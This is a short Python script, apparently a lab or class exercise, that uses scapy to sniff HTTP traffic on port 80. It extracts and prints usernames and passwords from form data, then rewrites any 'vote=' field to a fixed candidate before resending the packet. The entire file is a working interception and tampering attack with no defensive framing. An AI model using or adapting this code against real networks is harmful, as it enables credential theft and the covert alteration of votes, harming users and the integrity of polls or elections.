from scapy.all import *

userField = 'user='
passField = 'pass='
voteField = 'vote='
desiredVote = '2'


def http_header(packet):
    if Raw in packet:
        data = packet[Raw].load.decode()
        dataList = list(data)

        if userField in str(packet[Raw].load):
            index = data.find(userField)
            endIndex = data.find('&', index, len(data) - 1)
            scrapedUser = data[index + len(userField): endIndex]
            print("Username is: " + scrapedUser)

        if passField in str(packet[Raw].load):
            index = data.find(passField)
            endIndex = data.find('&', index, len(data) - 1)
            scrapedPass = data[index + len(passField): endIndex]
            print("Password is: " + scrapedPass)

        if voteField in str(packet[Raw].load):
            index = data.find(voteField)
            print("Original vote was for candidate " + dataList[index + len(voteField)])
            dataList[index + len(voteField)] = desiredVote
            print("Changed vote to " + desiredVote)

        data = "".join(dataList)
        packet[Raw].load = data
        print(packet.show())
    send(packet)


sniff(iface='\\Device\\NPF_Loopback', prn=http_header, filter="port 80")
